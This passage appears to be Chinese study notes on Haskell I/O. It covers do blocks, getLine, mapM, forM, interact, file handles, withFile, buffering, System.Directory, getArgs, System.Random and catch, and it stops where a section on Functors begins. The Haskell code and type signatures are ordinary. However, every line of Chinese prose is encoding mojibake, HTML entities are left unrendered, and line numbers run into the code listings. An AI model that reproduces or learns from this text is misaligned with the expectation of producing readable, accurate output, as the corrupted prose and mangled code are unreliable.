å…¶ä¸­putStrLnçš„ç±»å‹æ˜¯ï¼š putStrLn :: String -> IO () putStrLnæ¥æ”¶ä¸€ä¸ªStringç±»å‹ï¼Œå¹¶è¿”å›ä¸€ä¸ªç»“æœä¸º()ç±»å‹çš„IOåŠ¨ä½œï¼ˆI/O actionï¼‰ã€‚æ‰€ä»¥mainå‡½æ•°çš„ç±»å‹ä¸ºIO ()ã€‚ï¼ˆIOçš„Kindæ˜¯* -&gt; *ï¼‰ é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–é»˜è®¤æä¾›çš„è¾“å‡ºæ–‡æœ¬çš„å‡½æ•°ï¼š putStrï¼šè¾“å‡ºæ–‡æœ¬ï¼Œç»“å°¾ä¸æ¢è¡Œ putCharï¼šè¾“å‡ºå•ä¸ªå­—ç¬¦ï¼Œç»“å°¾ä¸æ¢è¡Œã€‚æ¥æ”¶çš„å‚æ•°ä¸ºå•ä¸ªCharï¼Œä¸æ˜¯Stringï¼ˆç”¨å•å¼•å·ä¸æ˜¯åŒå¼•å·ï¼‰ printï¼šå¯ä»¥æ¥æ”¶ä»»ä½•Showçš„æˆå‘˜ï¼Œå…ˆç”¨showè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ç„¶åè¾“å‡ºã€‚ç­‰åŒäºputStrLn . show do blockåœ¨mainå‡½æ•°ä¸­ä½¿ç”¨å¤šä¸ªputStrLnéœ€è¦ä½¿ç”¨doè¯­å¥ï¼š 123main = do putStrLn &quot;Line1&quot; putStrLn &quot;Line2&quot; å…¶ä¸­æœ€åä¸€è¡Œä¸€å®šè¦è¿”å›IO ()ç±»å‹çš„å€¼ è¾“å…¥æ–‡æœ¬è¾“å…¥æ–‡å­—éœ€è¦åœ¨doå—ä¸­ä½¿ç”¨getLineï¼š 123main = do line &lt;- getLine putStrLn line getLineçš„ç±»å‹æ˜¯ï¼š getLine :: IO String è€Œ&lt;-æ“ä½œç¬¦å°†getLineä¸­çš„Stringæå–äº†å‡ºæ¥ç»™åˆ°äº†lineï¼Œä½¿lineå˜æˆäº†Stringç±»å‹çš„ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ è€Œä¸”ä½¿ç”¨è¾“å…¥çš„å­—ç¬¦ä¸²å¿…é¡»è¦ç»è¿‡ä¸€æ¬¡&lt;-ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨getLineä½œä¸ºå­—ç¬¦ä¸²ï¼Œå› ä¸ºgetLineä¸æ˜¯Stringç±»å‹ï¼Œè€Œæ˜¯IO Stringç±»å‹ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨getCharæ¥è·å–å•ä¸ªå­—ç¬¦ï¼Œä½†ä»ç„¶éœ€è¦ä½¿ç”¨&lt;-æ“ä½œç¬¦æ¥æå–Char å…¶ä»–IOç›¸å…³å‡½æ•°ç”¨æ³•returnHaskellä¸­çš„returnå’Œå…¶ä»–å‘½ä»¤å¼è¯­è¨€ä¸­çš„returnå®Œå…¨ä¸åŒï¼Œå®ƒä¸ä¼šä½¿å‡½æ•°ç›´æ¥ç»“æŸå¹¶è¿”å›ä¸€ä¸ªå€¼ã€‚ mainå‡½æ•°å¿…é¡»å®šä¹‰ä¸ºç±»å‹ä¸ºIO ()çš„å‡½æ•°ï¼Œæ‰€ä»¥åœ¨mainå‡½æ•°ä¸­ä½¿ç”¨ifè¯­å¥ï¼Œå¦‚æœä¸è¾“å‡ºçš„è¯ä¹Ÿä¸å¯ä»¥ç›´æ¥æ”¾ä¸‹ä»€ä¹ˆéƒ½ä¸å¹²ï¼Œå› ä¸ºè¿™æ—¶å€™mainå‡½æ•°çš„ç±»å‹ä¸æ˜¯IO ()ã€‚æ‰€ä»¥è¿™æ—¶éœ€è¦ä½¿ç”¨return ()æ¥ä¸ºmainå‡½æ•°æŒ‡å®šä¸ºIO ()ç±»å‹ï¼Œä¾‹å¦‚ï¼š 123456main = do line &lt;- getLine if null line then return () -- &lt;-è¿™é‡Œ else do ... ä½¿ç”¨&lt;-æ“ä½œç¬¦ä¹Ÿå¯ä»¥ç›´æ¥å°†returnè¯­å¥ä¸­çš„å†…å®¹æå–å‡ºæ¥ï¼Œæ¯”å¦‚a &lt;- return â€˜Aâ€™ï¼Œæ‰§è¡Œåaå°±æ˜¯â€™Aâ€™ã€‚ whenwhenåŒ…å«åœ¨Control.Monadæ¨¡å—ä¸­ï¼Œå®ƒè¡¨ç¤ºåœ¨æ»¡è¶³ç¬¬ä¸€ä¸ªå‚æ•°çš„æ¡ä»¶ä¸‹ä¼šæ‰§è¡Œç¬¬äºŒä¸ªå‡½æ•°ï¼Œå¦åˆ™ä¼šreturn ()ã€‚æ¯”å¦‚ï¼š 1234567import Control.Monad main = do c &lt;- getChar when (c /= ' ') $ do putChar c main ç­‰åŒäºï¼š 1234567main = do c &lt;- getChar if c /= ' ' then do putChar c main else return () sequencesequenceåœ¨IOä¸­ä½¿ç”¨æ—¶å¯ä»¥è¾¾æˆ[IO a] -&gt; IO [a]çš„æ•ˆæœï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä½œï¼š 1[a, b, c] &lt;- sequence [getLine, getLine, getLine] mapM &amp; mapM_åœ¨IOç›¸å…³çš„åœ°æ–¹ä½¿ç”¨mapï¼Œå¯ä»¥ä½¿ç”¨mapMå’ŒmapM_ï¼Œå…¶ä¸­mapMæœ‰è¿”å›å€¼è€ŒmapM_ç›´æ¥æ‰”æ‰äº†è¿”å›å€¼ï¼š 123456789ghci&gt; mapM print [1,2,3] 1 2 3 [(),(),()] ghci&gt; mapM_ print [1,2,3] 1 2 3 foreverforeverå‡½æ•°åŒ…å«åœ¨Control.Monadæ¨¡å—ä¸­ã€‚åœ¨mainå‡½æ•°å¼€å¤´åŠ ä¸Šforeverå‡½æ•°å¯ä»¥ä½¿åé¢çš„doå—ä¸€ç›´é‡å¤æ‰§è¡Œç›´åˆ°ç¨‹åºè¢«è¿«ç»ˆæ­¢ï¼Œå¦‚ï¼š 1234import Control.Monad main = forever $ do ... forMforMå‡½æ•°åŒ…å«åœ¨Control.Monadæ¨¡å—ä¸­ï¼Œå®ƒçš„åŠŸèƒ½å’ŒmapMç±»ä¼¼ï¼Œä»ç¬¬ä¸€ä¸ªå‚æ•°ä¸­é€ä¸ªå–å‡ºå…ƒç´ ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ï¼ˆä¸€ä¸ªæ¥æ”¶ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ï¼‰ä¸­ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥è¿”å›IO aç±»å‹ã€‚æ¯”å¦‚ï¼š 123456789import Control.Monadmain = do colors &lt;- forM [1, 2, 3, 4] (\\a -&gt; do putStrLn $ &quot;Which color do you associate with the number &quot; ++ show a ++ &quot;?&quot; color &lt;- getLine return color) putStrLn &quot;The colors that you associate with 1, 2, 3 and 4 are: &quot; mapM putStrLn colors getContentsgetLineè·å–ä¸€æ•´è¡Œï¼Œè€ŒgetContentsä»æ ‡å‡†è¾“å…¥ä¸­è·å–å…¨éƒ¨å†…å®¹ç›´åˆ°é‡åˆ°EOFï¼Œå¹¶ä¸”å®ƒæ˜¯lazyçš„ï¼Œåœ¨æ‰§è¡Œäº†foo &lt;- getContentsåï¼Œå®ƒå¹¶ä¸ä¼šè¯»å–æ ‡å‡†è¾“å…¥å¹¶ä¸”èµ‹å€¼åˆ°fooï¼Œè€Œæ˜¯ç­‰åˆ°éœ€è¦ä½¿ç”¨fooçš„æ—¶å€™å†ä»æ ‡å‡†è¾“å…¥è¯»å–ã€‚ getContentsåœ¨ä½¿ç”¨ç®¡é“ä¼ å…¥æ–‡å­—æ—¶å¾ˆå¸¸ç”¨ï¼Œå¯ä»¥ä»£æ›¿forever+getLineä½¿ç”¨ï¼Œæ¯”å¦‚ä¸€ä¸ªHaskellç¨‹åºæ–‡ä»¶code.hsï¼š 12345import Data.Char main = do contents &lt;- getContents putStr (map toUpper contents) ä½¿ç”¨ghc â€“make codeç¼–è¯‘åï¼Œé€šè¿‡ç®¡é“ä¼ å…¥æ–‡å­—ï¼š 1cat text.txt | ./code ä¼šå°†text.txtä¸­çš„æ‰€æœ‰å­—æ¯è½¬ä¸ºå¤§å†™å¹¶è¾“å‡º interactä¸Šè¿°åŠŸèƒ½è¿˜å¯ä»¥è½¬åŒ–ä¸ºä¸€ä¸ªString -&gt; Stringçš„å‡½æ•°ï¼š 1upperStrings = unlines . map (map toUpper) . lines è€Œåœ¨mainä¸­ä½¿ç”¨è¿™ä¸ªå‡½æ•°å°±éœ€è¦ï¼š 123main = do contents &lt;- getContents putStr (upperStrings contents) ä½†æ˜¯String -&gt; Stringç±»å‹çš„å‡½æ•°åœ¨è¾“å…¥è¾“å‡ºä¸­çš„ä½¿ç”¨å¤ªå¸¸è§äº†ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨interactå‡½æ•°æ¥ç®€åŒ–ã€‚interactçš„ç±»å‹æ˜¯ï¼š interact :: (String -> String) -> IO () å¯ä»¥çœ‹å‡ºå®ƒæ¥æ”¶ä¸€ä¸ªString -&gt; Stringçš„å‡½æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªIO ()ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨åœ¨mainä¸Šã€‚ äºæ˜¯æ•´ä¸ªè½¬æ¢ä¸ºå¤§å†™çš„ç¨‹åºå°±å¯ä»¥ç®€åŒ–ä¸ºï¼š 1main = interact $ unlines . map (map toUpper) . lines æ–‡ä»¶å’Œæµä»¥ä¸‹ä¸æ–‡ä»¶å’Œæµç›¸å…³çš„å‡½æ•°éƒ½åŒ…å«åœ¨System.IOæ¨¡å—ä¸­ openFileopenFileå‡½æ•°å¯ä»¥ç”¨æ¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒçš„ç±»å‹æ˜¯ï¼š openFile :: FilePath -> IOMode -> IO Handle å…¶ä¸­FilePathæ˜¯Stringçš„type synonymsï¼Œç”¨ä¸€ä¸ªå­—ç¬¦ä¸²æ¥è¡¨ç¤ºéœ€è¦æ‰“å¼€çš„æ–‡ä»¶çš„è·¯å¾„ IOModeçš„å®šä¹‰æ˜¯ï¼š 1data IOMode = ReadMode | WriteMode | AppendMode | ReadWriteMode æ‰€ä»¥å®ƒä¸€å…±åªæœ‰å››ä¸ªå€¼ï¼Œç”¨æ¥è¡¨ç¤ºè¿›è¡ŒIOæ“ä½œçš„æ¨¡å¼ openFileè¿”å›ä¸€ä¸ªIO Handleç±»å‹çš„å€¼ï¼Œå°†å…¶ç”¨&lt;-æ“ä½œç¬¦æå–åä¼šå‡ºç°ä¸€ä¸ªHandleçš„å€¼ã€‚ä½†ä¸èƒ½ä»Handleä¸­ç›´æ¥ä½¿ç”¨æ–‡å­—ï¼Œè¿˜éœ€è¦ä½¿ç”¨ä¸€ç³»åˆ—å‡½æ•°ï¼š hGetContents :: Handle -&gt; IO String ï¼Œä»Handleä¸­è¯»å–å…¨éƒ¨å†…å®¹ï¼Œè¿”å›ä¸€ä¸ªIO String hGetChar :: Handle -&gt; IO Char ï¼Œä»Handleä¸­è¯»å–ä¸€ä¸ªå­—ç¬¦ hGetLine :: Handle -&gt; IO String ï¼Œä»Handleä¸­è¯»å–ä¸€è¡Œï¼Œè¿”å›ä¸€ä¸ªIO String hPutStr :: Handle -&gt; String -&gt; IO () ï¼Œå‘Handleä¸­è¾“å‡ºå­—ç¬¦ä¸² hPutStrLn :: Handle -&gt; String -&gt; IO () ï¼ŒåŒä¸Š åœ¨ä½¿ç”¨openFileè¿›è¡Œæ–‡ä»¶æ“ä½œåï¼Œéœ€è¦ä½¿ç”¨hCloseæ‰‹åŠ¨å…³é—­Handleã€‚hClose :: Handle -&gt; IO ()ï¼Œæ¥æ”¶ä¸€ä¸ªHandleå¹¶è¿”å›IO ()ï¼Œå¯ä»¥ç›´æ¥æ”¾åœ¨mainå‡½æ•°æœ«å°¾ æ‰€ä»¥ä½¿ç”¨openFileè¯»å–ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å…¨éƒ¨å†…å®¹å¹¶è¾“å‡ºçš„å…¨éƒ¨ä»£ç æ˜¯ï¼š 1234567import System.IOmain = do handle &lt;- openFile &quot;text.txt&quot; ReadMode contents &lt;- hGetContents handle putStrLn contents hClose handle withFilewithFileç±»ä¼¼Pythonä¸­çš„with openï¼Œå®ƒåœ¨è¯»å–æ–‡ä»¶ä½¿ç”¨ä¹‹åä¸éœ€è¦æ‰‹åŠ¨closeæ–‡ä»¶ã€‚å®ƒçš„ç±»å‹æ˜¯ï¼š withFile :: FilePath -> IOMode -> (Handle -> IO a) -> IO a å¯ä»¥çœ‹å‡ºï¼Œå®ƒæ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼š FilePathï¼šä¸€ä¸ªè¡¨ç¤ºæ–‡ä»¶è·¯å¾„çš„String IOModeï¼šæ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼ (Handle -&gt; IO a)ï¼šä¸€ä¸ªå‡½æ•°ï¼Œè¡¨ç¤ºå¯¹è¯»å–æ–‡ä»¶åçš„Handleç´¢è¦è¿›è¡Œçš„æ“ä½œï¼Œéœ€è¦è¿”å›ä¸€ä¸ªI/O actionï¼›è€Œè¿™ä¸ªè¿”å›å€¼ä¹Ÿå°†ä½œä¸ºwithFileçš„è¿”å›å€¼ ç°åœ¨ä½¿ç”¨withFileæ¥æ”¹å†™ä¸Šè¿°ä»£ç ï¼š 12345import System.IOmain = withFile &quot;text.txt&quot; ReadMode (\\handle -&gt; do contents &lt;- hGetContents handle putStrLn contents) withFileçš„åŠŸèƒ½ç›¸å½“äºä»¥ä¸‹å‡½æ•°ï¼š 123456withFile' :: FilePath -&gt; IOMode -&gt; (Handle -&gt; IO a) -&gt; IO a withFile' path mode f = do handle &lt;- openFile path mode result &lt;- f handle hClose handle return result readFilereadFileå¯ä»¥æ›´åŠ ç®€åŒ–è¯»å–æ–‡ä»¶å†…å®¹çš„æ“ä½œï¼Œå®ƒçš„ç±»å‹ï¼š readFile :: FilePath -> IO String å®ƒåªéœ€è¦è¾“å…¥ä¸€ä¸ªè¡¨ç¤ºæ–‡ä»¶è·¯å¾„çš„å­—ç¬¦ä¸²ï¼Œè¿”å›å…¶ä¸­ä»¥å…¶ä¸­å†…å®¹ä¸ºå†…å®¹çš„I/O actionï¼š 12345import System.IOmain = do contents &lt;- readFile &quot;text.txt&quot; putStrLn contents writeFilewriteFileç®€åŒ–äº†å†™å…¥æ–‡ä»¶çš„æ“ä½œï¼Œå®ƒçš„ç±»å‹ï¼š writeFile :: FilePath -> String -> IO () ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦å†™å…¥çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦å†™å…¥çš„å­—ç¬¦ä¸²ï¼Œè¿”å›ä¸€ä¸ªIO () appendFileappendFileç±»ä¼¼writeFileï¼Œä½†ä½¿ç”¨å®ƒä¸ä¼šè¦†ç›–æ–‡ä»¶ä¸­åŸæ¥å†…å®¹ï¼Œè€Œæ˜¯ç›´æ¥æŠŠå­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶æœ«å°¾ bufferæ–‡ä»¶ä»¥æµçš„å½¢å¼è¢«è¯»å–ï¼Œé»˜è®¤æ–‡å­—æ–‡ä»¶çš„ç¼“å†²åŒºï¼ˆbufferï¼‰å¤§å°æ˜¯ä¸€è¡Œï¼Œå³æ¯æ¬¡è¯»å–ä¸€è¡Œå†…å®¹ï¼›é»˜è®¤äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¼“å†²åŒºå¤§å°æ˜¯ä»¥å—ä¸ºå•ä½ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šåˆ™æ ¹æ®ç³»ç»Ÿé»˜è®¤æ¥é€‰æ‹©ã€‚ ä¹Ÿå¯ä»¥é€šè¿‡hSetBufferingå‡½æ•°æ¥æ‰‹åŠ¨è®¾ç½®ç¼“å†²åŒºå¤§å°ï¼Œè¿™ä¸ªå‡½æ•°çš„ç±»å‹ï¼š hSetBuffering :: Handle -> BufferMode -> IO () å®ƒæ¥æ”¶ä¸€ä¸ªhandleï¼Œå’Œä¸€ä¸ªBufferModeï¼Œå¹¶è¿”å›IO ()ã€‚å…¶ä¸­BufferModeæœ‰ä»¥ä¸‹å‡ ç§ï¼š NoBufferingï¼šæ²¡æœ‰ç¼“å†²åŒºï¼Œä¸€æ¬¡è¯»å…¥ä¸€ä¸ªå­—ç¬¦ LineBufferingï¼šç¼“å†²åŒºå¤§å°æ˜¯ä¸€è¡Œï¼Œå³æ¯æ¬¡è¯»å…¥ä¸€è¡Œå†…å®¹ BlockBuffering (Maybe Int)ï¼šç¼“å†²åŒºå¤§å°æ˜¯ä¸€å—ï¼Œå—çš„å¤§å°ç”±Maybe IntæŒ‡å®šï¼š BlockBuffering (Nothing)ï¼šä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„å—å¤§å° BlockBuffering (Just 2048)ï¼šä¸€å—çš„å¤§å°æ˜¯2048å­—èŠ‚ï¼Œå³æ¯æ¬¡è¯»å…¥2048bytesçš„å†…å®¹ ç¼“å†²åŒºçš„åˆ·æ–°æ˜¯è‡ªåŠ¨çš„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡hFlushæ¥æ‰‹åŠ¨åˆ·æ–° hFlush :: Handle -> IO () ä¼ å…¥ä¸€ä¸ªhandleï¼Œè¿”å›IO ()ï¼Œå³åˆ·æ–°å¯¹åº”handleçš„ç¼“å†²åŒº openTempFileopenTempFileå¯ä»¥æ–°å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼š openTempFile :: FilePath -> String -> IO (FilePath, Handle) FilePathæŒ‡ä¸´æ—¶æ–‡ä»¶è¦åˆ›å»ºçš„ä½ç½®è·¯å¾„ï¼ŒStringæŒ‡ä¸´æ—¶æ–‡ä»¶åå­—çš„å‰ç¼€ï¼Œè¿”å›ä¸€ä¸ªI/O actionï¼Œå…¶å†…å®¹ç¬¬ä¸€ä¸ªFilePathæ˜¯åˆ›å»ºå¾—åˆ°çš„ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„ï¼ŒHandleæ˜¯ä¸´æ—¶æ–‡ä»¶çš„handle ä¾‹å¦‚ï¼š 123456import System.IOmain = do (tempFile, tempHandle) &lt;- openTempFile &quot;.&quot; &quot;temp&quot; ... hClose tempHandle &quot;.&quot;æŒ‡ä¸´æ—¶æ–‡ä»¶è¦åœ¨å½“å‰ç›®å½•åˆ›å»ºï¼Œ&quot;temp&quot;æŒ‡ä¸´æ—¶æ–‡ä»¶åå­—ä»¥tempå¼€å¤´ã€‚æœ€ç»ˆå¾—åˆ°çš„tempFileå°±æ˜¯./tempâ€¦â€¦.ï¼Œtempåä¸ºéšæœºæ•°å­—ï¼Œå¦‚./temp43620-0 è·¯å¾„æ“ä½œç›¸å…³å‡½æ•°éƒ½åŒ…å«åœ¨System.Directoryæ¨¡å—ä¸­ï¼Œå…¨éƒ¨å†…å®¹è§System.Directory getCurrentDirectorygetCurrentDirectory :: IO FilePath ç›´æ¥è¿”å›ä¸€ä¸ªI/O actionï¼Œå…¶å†…å®¹æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²è¡¨ç¤ºå½“å‰è·¯å¾„çš„ç»å¯¹è·¯å¾„ removeFileremoveFile :: FilePath -> IO () è¾“å…¥ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œå¹¶åˆ é™¤æ‰å®ƒ renameFilerenameFile :: FilePath -> FilePath -> IO () è¾“å…¥ä¸€ä¸ªåŸè·¯å¾„ï¼Œä¸€ä¸ªæ–°è·¯å¾„ï¼Œä¸ºåŸè·¯å¾„çš„æ–‡ä»¶é‡å‘½åä¸ºæ–°è·¯å¾„çš„å doesFileExistdoesFileExist :: FilePath -> IO Bool æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«å¸ƒå°”å€¼çš„I/O action Command line argumentsSystem.Environmentæ¨¡å—ä¸­æä¾›äº†ä¸¤ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥å¤„ç†ä¼ å…¥å‘½ä»¤è¡Œçš„å‚æ•° getArgsgetArgs :: IO [String] ä¸éœ€è¦è¾“å…¥å‚æ•°ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªI/O actionï¼Œå†…å®¹ä¸ºä¼ å…¥å‘½ä»¤è¡Œçš„å‚æ•°ï¼ˆä¸€ä¸ªç”±Stringç»„æˆçš„åˆ—è¡¨ï¼‰ã€‚ç›¸å½“äºCè¯­è¨€ä¸­çš„argv[1:] getProgNamegetProgName :: IO String è¿”å›I/O actionï¼Œå†…å®¹ä¸ºç¨‹åºçš„åå­—ï¼Œç›¸å½“äºCè¯­è¨€ä¸­çš„argv[0] Randomnesså’Œéšæœºæ•°æœ‰å…³çš„å‡½æ•°éƒ½åŒ…å«åœ¨System.Randomæ¨¡å—ä¸­ã€‚GHCiå¯åŠ¨æ—¶å¯èƒ½ä¸ä¼šåŒ…å«System.Randomçš„é…ç½®ï¼Œå¯¼è‡´æ— æ³•æ‰¾åˆ°æ¨¡å—ã€‚éœ€è¦é€šè¿‡stackæ‰“å¼€: 1stack ghci --package random Haskellè¦æ±‚åŒæ ·çš„ç¨‹åºéœ€è¦è¿è¡Œå‡ºåŒæ ·çš„ç»“æœï¼Œé™¤äº†ç”¨åˆ°äº†I/O actionï¼Œæ‰€æœ‰ä¼šé€ æˆä¸åŒç»“æœçš„å‡½æ•°éƒ½è¦äº¤ç»™I/O actionæ¥å®Œæˆ é‚£è¦ä½¿éšæœºæ•°è„±ç¦»IOå­˜åœ¨ï¼Œå°±è¦ç”¨åˆ°éšæœºç”Ÿæˆå™¨ï¼ˆrandom generatorï¼‰ System.Randomæ¨¡å—æä¾›äº†å‡ ä¸ªç”Ÿæˆéšæœºæ•°çš„å‡½æ•°ï¼š randomrandom :: (Random a, RandomGen g) => g -> (a, g) å…¶ä¸­åˆæœ‰ä¸¤ä¸ªæ–°çš„typeclassï¼ŒRandomè¡¨ç¤ºå¯ä»¥å–éšæœºï¼ŒRandomGenè¡¨ç¤ºéšæœºæ•°ç”Ÿæˆå™¨ã€‚randomå‡½æ•°æ¥æ”¶ä¸€ä¸ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œè¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ç”Ÿæˆçš„éšæœºæ•°ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªæ–°çš„éšæœºæ•°ç”Ÿæˆå™¨ è·å–éšæœºæ•°ç”Ÿæˆå™¨å¯ä»¥ä½¿ç”¨mkStdGenå‡½æ•°ï¼š mkStdGen :: Int -> StdGen å…¶ä¸­StdGenæ˜¯ä¸€ä¸ªRandomGençš„å®ä¾‹ è¿ç”¨randomç”Ÿæˆéšæœºæ•°éœ€è¦æŒ‡å®šç±»å‹ï¼Œä¸ç„¶ç¨‹åºæ— æ³•ç¡®å®šaæ˜¯ä»€ä¹ˆç±»å‹ã€‚ä¾‹å¦‚ï¼š 123456ghci&gt; random (mkStdGen 100) :: (Int, StdGen)(9216477508314497915,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})ghci&gt; random (mkStdGen 100) :: (Char, StdGen)('\\537310',StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})ghci&gt; random (mkStdGen 100) :: (Bool, StdGen)(True,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125}) å†æ¬¡è¿è¡ŒåŒæ ·çš„å‡½æ•°ï¼Œä¼šå¾—åˆ°åŒæ ·çš„ç»“æœã€‚æ‰€ä»¥å¦‚æœéœ€è¦ç”Ÿæˆå…¶ä»–çš„éšæœºæ•°ï¼Œéœ€è¦æ›´æ¢ç”Ÿæˆå™¨ï¼Œå°±å¯ä»¥ä½¿ç”¨ä¸Šä¸€æ¬¡è°ƒç”¨ç»“æœè¿”å›çš„æ–°éšæœºæ•°ç”Ÿæˆå™¨ï¼š 123456threeCoins :: StdGen -&gt; (Bool, Bool, Bool) threeCoins gen = let (firstCoin, newGen) = random gen (secondCoin, newGen') = random newGen (thirdCoin, newGen'') = random newGen' in (firstCoin, secondCoin, thirdCoin) randomsrandoms :: (Random a, RandomGen g) => g -> [a] randomsæ¥æ”¶ä¸€ä¸ªRandomGenï¼Œè¿”å›ä¸€ä¸ªéšæœºçš„æ— ç©·åˆ—è¡¨ã€‚å› ä¸ºå®ƒæ˜¯æ— ç©·çš„ï¼Œæ‰€ä»¥ä¸ä¼šè¿”å›æ–°çš„éšæœºæ•°ç”Ÿæˆå™¨ randomRrandomR :: (Random a, RandomGen g) => (a, a) -> g -> (a, g) å¯ä»¥ç”¨æ¥ç”Ÿæˆæœ‰èŒƒå›´çš„éšæœºæ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œè¡¨ç¤ºç”Ÿæˆéšæœºæ•°çš„èŒƒå›´(é—­åŒºé—´) randomRsrandomRs :: (Random a, RandomGen g) => (a, a) -> g -> [a] åŒä¸Šä¸¤ä¸ªï¼Œç”Ÿæˆæœ‰èŒƒå›´çš„æ— ç©·éšæœºæ•°åˆ—è¡¨ getStdGenå¦‚æœæƒ³è¦è®©ç¨‹åºæ¯æ¬¡è¿è¡Œå¾—åˆ°ä¸åŒçš„éšæœºç»“æœï¼Œéœ€è¦ä½¿ç”¨getStdGenæ¥è·å–å…¨å±€éšæœºæ•°ç”Ÿæˆå™¨ï¼Œå®ƒä¼šåœ¨æ¯æ¬¡è¿è¡Œçš„æ—¶å€™äº§ç”Ÿä¸åŒçš„å€¼ï¼Œä¹Ÿå› æ­¤ï¼Œå®ƒè¿”å›çš„æ˜¯ä¸€ä¸ªI/O actionï¼Œè€Œä¸æ˜¯ä¸€ä¸ªç›´æ¥çš„StdGen getStdGen :: Control.Monad.IO.Class.MonadIO m => m StdGen å³å¯ä»¥çœ‹æˆgetStdGen :: IO StdGenï¼Œéœ€è¦ä½¿ç”¨&lt;-æ“ä½œç¬¦å°†StdGenæå–å‡ºæ¥ ä½†æ˜¯åœ¨åŒä¸€ä¸ªç¨‹åºä¸­ï¼ŒgetStdGençš„ç»“æœæ˜¯ç›¸åŒçš„ï¼Œå…¨å±€éšæœºæ•°ç”Ÿæˆå™¨ä¸ä¼šè‡ªåŠ¨æ›´æ–°ï¼Œæ‰€ä»¥å°±éœ€è¦å¦ä¸€ä¸ªå‡½æ•°newStdGen newStdGennewStdGen :: Control.Monad.IO.Class.MonadIO m => m StdGen æ‰§è¡ŒnewStdGenä¼šè¿›è¡Œä¸¤ä¸ªæ“ä½œï¼š æ›´æ–°å…¨å±€éšæœºæ•°ç”Ÿæˆå™¨ï¼Œä¸‹æ¬¡æ‰§è¡ŒgetStdGenä¼šè·å¾—ä¸åŒçš„ç»“æœ è¿”å›ä¸€ä¸ªI/O actionï¼ŒåŒ…å«ä¸€ä¸ªæ–°çš„StdGenï¼ˆä½†æ˜¯è¿™ä¸ªç”Ÿæˆå™¨å’Œå…¨å±€ç”Ÿæˆå™¨ä¹Ÿä¸åŒï¼‰ Exceptionsç¨‹åºåœ¨è¿è¡Œå¤±è´¥æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¯ä»¥é€šè¿‡Control.Exceptionæ¨¡å—ä¸­çš„catchå‡½æ•°æ¥æ•è·å¼‚å¸¸ï¼š catch :: Exception e => IO a -> (e -> IO a) -> IO a ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è¿›è¡Œçš„æ“ä½œï¼Œä»¥IO aä¸ºè¿”å›å€¼çš„ç±»å‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒæ¥æ”¶å¼‚å¸¸å¹¶è¿›è¡Œæ“ä½œï¼Œä¾‹å¦‚ï¼š 12345678910import Control.Exceptionmain = main' `catch` handlermain' :: IO ()main' = do ...handler :: Exception e =&gt; e -&gt; IO ()handler e = putStrLn &quot;...&quot; ä¹Ÿå¯ä»¥åˆ©ç”¨å®ˆå«ï¼ˆguardï¼‰è¯­æ³•å’ŒSystem.IO.Errorä¸­çš„å‡½æ•°æ¥åˆ¤æ–­IOå¼‚å¸¸çš„ç±»å‹æ¥è¿›è¡Œä¸åŒæ“ä½œï¼š 123456789101112131415import System.Environmentimport System.IO.Errorimport Control.Exception main = toTry `catch` handler toTry :: IO () toTry = do (fileName:_) &lt;- getArgs contents &lt;- readFile fileName putStrLn $ &quot;The file has &quot; ++ show (length (lines contents)) ++ &quot; lines!&quot; handler :: IOError -&gt; IO () handler e | isDoesNotExistError e = putStrLn &quot;The file doesn't exist!&quot; | otherwise = ioError e å…·ä½“ç›¸å…³å…¨éƒ¨å‡½æ•°è§æ–‡æ¡£ï¼šSystem.IO.Errorã€Control.Exception Functorså‡½å­ï¼ˆFunctorï¼‰æ˜¯ä¸€ä¸ªç±»å‹ç±»ï¼ˆtypeclassï¼‰ï¼Œå’Œå…¶ä»–ç±»å‹ç±»ä¸€æ 